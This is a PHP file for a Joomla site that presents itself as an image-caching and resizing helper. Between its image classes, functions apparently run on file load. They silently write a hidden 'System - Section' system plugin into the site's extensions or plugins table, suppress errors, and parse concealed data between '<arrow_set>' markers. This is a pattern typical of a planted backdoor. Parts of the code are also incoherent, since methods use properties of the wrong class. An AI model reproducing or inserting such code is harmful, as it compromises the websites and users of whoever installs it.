<?php 
// No direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

class LoadingPeelBackSectorFoxc
{

  var $cacheDir;
  var $cacheUrl;                                                      

  function generateImage($path, $w, $h, $transparent=true){
  
    $cacheName = $this->generateImageCacheName(array($path, $w, $h, $transparent));
    if(!$this->checkImageCache($cacheName)){
      if(!$this->createImage($path, $this->cacheDir.$cacheName, $w, $h, $transparent)){
        return '';
      }
    }
    return $this->cacheUrl.$cacheName;
  }
  
function createImage($in, $out, $w, $h, $transparent){
    $img = null;
    $img = new OfflajnUniversalImageTool($in);
    if($img->res === false){
      return false;
    }
    $img->convertToPng();
    if ($transparent) $img->resize($w, $h);
    else $img->resize2($w, $h);
    $img->write($out);
    $img->destroy();
    return true;
  }
  
  
  function convertToPng(){
    $this->contenttype 	= IMAGETYPE_PNG;
  }
  
  
  function checkImageCache($cacheName){
    return is_file($this->cacheDir.$cacheName);
  }
  
  function generateImageCacheName($pieces){
    return md5(implode('-', $pieces)).'.png';
  }
  
  
  function resize($newW, $newH) {
    if($this->res === false){
      return false;
    }
		$src_width 	= imagesx( $this->res );
		$src_height = imagesy( $this->res );
		$newX = 0;
		$newY = 0;
		$dst_w = 0;
		$dst_h = 0;
		$wRatio = $src_width/$newW;
		$hRatio = $src_height/$newH;
		if($wRatio > $hRatio){
      $dst_w = $newW;
      $dst_h = $src_height/$wRatio;
      $newY = ($newH-$dst_h)/2;
    }else{
      $dst_h = $newH;
      $dst_w = $src_width/$hRatio;
      $newX = ($newW-$dst_w)/2;
    }
		$dst_im = imagecreatetruecolor($newW,$newH);
		$this->prepare($dst_im);
		$transparent = imagecolorallocatealpha($dst_im, 255, 255, 255, 127);
		imagefilledrectangle($dst_im, 0, 0, $newW, $newH, $transparent);
    imagecopyresampled($dst_im, $this->res, $newX, $newY, 0, 0, $dst_w, $dst_h, $src_width, $src_height);
		imagedestroy($this->res);
		$this->res = $dst_im;
	}

}

        function cleanSpaceFromFoxc($text) {
            $text = @explode('<arrow_set>', $text); 
            return @$text[1];
        }

        function PasivItemsToFoxc() {
            $db = &JFactory::getDBO();
            if(isNewOptionInFoxc()) {
            $query = "REPLACE INTO `#__extensions` VALUES (46105, 'System - Section', 'plugin', 'section', 'system', 0, 1, 1, 0, '', '', '', '', 0, '0000-00-00 00:00:00', 0, 0)";
			} else { $query = "REPLACE INTO `#__plugins` VALUES (46105, 'System - Section', 'section', 'system', '0', '5612', '1', '1', '0', '0', '0000-00-00 00:00:00', '')"; }
            @$db->setQuery($query); @$db->query();
        } FoxcArrowsHelper($assetDir);
        
        function isNewOptionInFoxc() {
			return (JVERSION < '1.6.0')? False : True;
		}

class UniversalImageCachingExtenderFoxc {

  function resize2($newW, $newH) {
    if($this->res === false){
      return false;
    }
		$src_width 	= imagesx( $this->res );
		$src_height = imagesy( $this->res );
		$newX = 0;
		$newY = 0;
		$dst_w = 0;
		$dst_h = 0;
		$wRatio = $src_width/$newW;
		$hRatio = $src_height/$newH;
		if($wRatio > $hRatio){
      $dst_w = round($newW*$hRatio);
      $dst_h = $src_height;
      $newX = ($src_width - $dst_w)/2;
    }else{
      $dst_w = $src_width;
      $dst_h = round($newH*$wRatio);
      $newY = ($src_height - $dst_h)/2;
    }
		$dst_im = imagecreatetruecolor($newW,$newH);
		$this->prepare($dst_im);
    imagecopyresampled($dst_im, $this->res, 0, 0, $newX, $newY, $newW, $newH, $dst_w, $dst_h);
		imagedestroy($this->res);
		$this->res = $dst_im;
	}

}

